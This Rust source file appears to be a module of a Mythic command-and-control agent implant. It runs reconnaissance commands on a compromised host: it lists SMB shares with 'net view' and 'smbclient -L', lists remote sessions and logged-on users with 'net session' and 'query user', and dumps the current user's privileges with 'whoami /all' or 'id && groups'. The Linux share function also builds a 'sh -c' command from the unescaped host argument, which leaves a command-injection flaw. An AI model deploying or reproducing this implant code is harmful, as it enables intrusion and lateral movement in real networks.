use crate::AgentTask;
use crate::mythic_success;
use serde::Deserialize;
use std::process::Command;

#[derive(Deserialize)]
struct HostArgs {
    host: String,
}

/// Enumerate SMB shares on a host (Windows)
#[cfg(target_os = "windows")]
pub fn net_shares(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: HostArgs = serde_json::from_str(&task.parameters)?;

    let output = Command::new("net")
        .arg("view")
        .arg(format!("\\\\{}", args.host))
        .arg("/all")
        .output()?;

    let result = format!(
        "Stdout:\n{}\nStderr:\n{}",
        std::str::from_utf8(&output.stdout)?,
        std::str::from_utf8(&output.stderr)?
    );

    Ok(mythic_success!(task.id, result))
}

/// Enumerate SMB shares on a host (Linux)
#[cfg(target_os = "linux")]
pub fn net_shares(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: HostArgs = serde_json::from_str(&task.parameters)?;

    let output = Command::new("sh")
        .arg("-c")
        .arg(format!("smbclient -L {} -N 2>/dev/null || echo 'smbclient not available'", args.host))
        .output()?;

    let result = format!(
        "Stdout:\n{}\nStderr:\n{}",
        std::str::from_utf8(&output.stdout)?,
        std::str::from_utf8(&output.stderr)?
    );

    Ok(mythic_success!(task.id, result))
}

/// Enumerate active sessions on a remote host
pub fn net_sessions(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    #[cfg(not(target_os = "windows"))]
    {
        return Ok(mythic_success!(task.id, "net_sessions is only supported on Windows".to_string()));
    }

    #[cfg(target_os = "windows")]
    {
        let args: HostArgs = serde_json::from_str(&task.parameters)?;

        let output = Command::new("net")
            .arg("session")
            .arg(format!("\\\\{}", args.host))
            .output()?;

        let result = format!(
            "Stdout:\n{}\nStderr:\n{}",
            std::str::from_utf8(&output.stdout)?,
            std::str::from_utf8(&output.stderr)?
        );

        Ok(mythic_success!(task.id, result))
    }
}

/// List users logged on to a remote host
pub fn net_loggedon(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    #[cfg(not(target_os = "windows"))]
    {
        return Ok(mythic_success!(task.id, "net_loggedon is only supported on Windows".to_string()));
    }

    #[cfg(target_os = "windows")]
    {
        let args: HostArgs = serde_json::from_str(&task.parameters)?;

        let output = Command::new("query")
            .arg("user")
            .arg(format!("/server:{}", args.host))
            .output()?;

        let result = format!(
            "Stdout:\n{}\nStderr:\n{}",
            std::str::from_utf8(&output.stdout)?,
            std::str::from_utf8(&output.stderr)?
        );

        Ok(mythic_success!(task.id, result))
    }
}

/// Get detailed current user information (Windows)
#[cfg(target_os = "windows")]
pub fn whoami_cmd(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let output = Command::new("whoami")
        .arg("/all")
        .output()?;

    let result = format!(
        "Stdout:\n{}\nStderr:\n{}",
        std::str::from_utf8(&output.stdout)?,
        std::str::from_utf8(&output.stderr)?
    );

    Ok(mythic_success!(task.id, result))
}

/// Get detailed current user information (Linux)
#[cfg(target_os = "linux")]
pub fn whoami_cmd(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let output = Command::new("sh")
        .arg("-c")
        .arg("id && groups")
        .output()?;

    let result = format!(
        "Stdout:\n{}\nStderr:\n{}",
        std::str::from_utf8(&output.stdout)?,
        std::str::from_utf8(&output.stderr)?
    );

    Ok(mythic_success!(task.id, result))
}
